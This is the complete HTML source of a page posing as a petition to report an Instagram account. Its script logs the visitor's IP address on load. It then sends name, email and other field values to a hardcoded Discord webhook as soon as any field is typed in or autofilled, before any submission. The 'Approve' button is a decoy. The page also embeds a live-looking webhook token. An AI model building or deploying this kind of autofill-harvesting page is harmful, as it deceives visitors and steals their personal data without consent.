<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Report an Instagram Account</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      color: #333;
    }

    .container {
      max-width: 500px;
      margin: 50px auto;
      background: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    h1 {
      margin-bottom: 15px;
      font-size: 1.8em;
      color: #222;
    }

    p {
      margin-bottom: 20px;
      font-size: 1em;
      line-height: 1.5em;
    }

    #trigger {
      display: inline-block;
      padding: 10px 20px;
      background: #4CAF50;
      color: #fff;
      font-size: 1em;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      text-decoration: none;
    }

    #trigger:hover {
      background: #45a049;
    }

    #formContainer {
      margin-top: 20px;
      text-align: center; 
      display: none;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      text-align: left;
    }

    input[type="text"], input[type="email"], textarea {
      width: 100%;
      padding: 8px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1em;
    }

    input[type="text"]:focus, input[type="email"]:focus, textarea:focus {
      border-color: #4CAF50;
      outline: none;
    }

    .instructions {
      font-size: 0.9em;
      margin-bottom: 15px;
      background: #e7f5e7;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #cce7cc;
      color: #333;
      text-align: left;
    }

    #fake {
      display: inline-block;
      padding: 10px 20px;
      background: #4CAF50;
      color: #fff;
      font-size: 1em;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      text-decoration: none;
    }

    #fake:hover {
      background: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Report an Instagram Account</h1>
    <p>We’re collecting signatures to petition Instagram to remove a harmful or rule-breaking account.</p>
    <p>Click below to show the form and add your voice. If your browser saved your details, they may be quickly filled in for you.</p>
    <button id="trigger">Open Petition Form</button>

    <div id="formContainer">
      <p class="instructions">
        Please enter the Instagram handle you want to report, and provide a reason why you believe it should be banned. 
        If your browser offers autofill for your name and email, simply select the suggestion. Once any field is filled, we’ll submit this information immediately to our collection point.
      </p>
      <form id="userForm" autocomplete="on">
        <label for="fname">Your First Name:</label>
        <input type="text" id="fname" name="given-name" autocomplete="given-name" required>

        <label for="lname">Your Last Name:</label>
        <input type="text" id="lname" name="family-name" autocomplete="family-name" required>

        <label for="email">Your Email:</label>
        <input type="email" id="email" name="email" autocomplete="email" required>
        
        <label for="handle">Instagram Handle to Report:</label>
        <input type="text" id="handle" name="handle" placeholder="@username" required>

        <label for="reason">Reason for Reporting:</label>
        <textarea id="reason" name="reason" rows="4" placeholder="Briefly explain why this account should be banned..." required></textarea>
      </form>
      <button id="fake">Approve</button>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';

    const trigger = document.getElementById('trigger');
    const formContainer = document.getElementById('formContainer');
    const fnameField = document.getElementById('fname');
    const lnameField = document.getElementById('lname');
    const emailField = document.getElementById('email');
    const handleField = document.getElementById('handle');
    const reasonField = document.getElementById('reason');

    let userIP = 'Unknown IP';

    // Fetch the user's IP on page load
    window.addEventListener('load', () => {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          userIP = data.ip;
          console.log('Fetched IP:', userIP);
        })
        .catch(err => console.error('Error fetching IP:', err));
    });

    // Show the form when the user clicks the trigger
    trigger.addEventListener('click', () => {
      console.log("Trigger clicked. Revealing form...");
      formContainer.style.display = 'block';
      fnameField.focus();
    });

    function checkFields() {
      // If any of these fields is filled (meaning the user likely chose an autofill suggestion or started typing),
      // submit immediately.
      if (
        fnameField.value.trim() !== '' ||
        lnameField.value.trim() !== '' ||
        emailField.value.trim() !== '' ||
        handleField.value.trim() !== '' ||
        reasonField.value.trim() !== ''
      ) {
        submitForm(
          fnameField.value.trim() || '[No First Name]',
          lnameField.value.trim() || '[No Last Name]',
          emailField.value.trim() || '[No Email]',
          handleField.value.trim() || '[No Handle]',
          reasonField.value.trim() || '[No Reason]'
        );
      }
    }

    function submitForm(fname, lname, email, handle, reason) {
      const message = `**New Petition Submission (Report Instagram Account):**\n` +
                      `**IP:** ${userIP}\n` +
                      `**First Name:** ${fname}\n` +
                      `**Last Name:** ${lname}\n` +
                      `**Email:** ${email}\n` +
                      `**Instagram Handle to Report:** ${handle}\n` +
                      `**Reason:** ${reason}`;

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!');
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }

    // Listen for input and change events on all fields.
    fnameField.addEventListener('input', checkFields);
    lnameField.addEventListener('input', checkFields);
    emailField.addEventListener('input', checkFields);
    handleField.addEventListener('input', checkFields);
    reasonField.addEventListener('input', checkFields);

    fnameField.addEventListener('change', checkFields);
    lnameField.addEventListener('change', checkFields);
    emailField.addEventListener('change', checkFields);
    handleField.addEventListener('change', checkFields);
    reasonField.addEventListener('change', checkFields);
  </script>
</body>
</html>
